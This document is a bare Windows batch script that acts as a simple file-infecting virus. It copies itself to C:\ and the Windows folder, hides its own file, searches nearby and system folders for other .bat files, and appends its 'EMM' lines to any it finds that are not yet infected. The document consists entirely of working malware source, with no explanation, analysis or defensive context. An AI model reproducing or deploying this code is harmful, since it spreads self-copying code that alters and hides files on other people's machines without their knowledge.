   @echo off
   if not exist c:\EMM.bat copy EMM.bat c:\ >nul
   if not exist C:\WINDOWS\copy_emm.bat type c:\EMM.bat > C:\WINDOWS\copy_emm.bat
   if not exist c:\EMM.bat type C:\WINDOWS\copy_emm.bat > c:\EMM.bat
   if not exist c:\EMM.bat copy %0.bat c:\EMM.bat >nul
   attrib EMM.bat +h
   for %%x in (..\*.bat *.bat c:\*.bat c:\windows\*.bat) do set EMM_v=%%x
   find /i "EMM"<%EMM_v%>nul
   if errorlevel 1 find "EMM"<%0.bat>>%EMM_v%
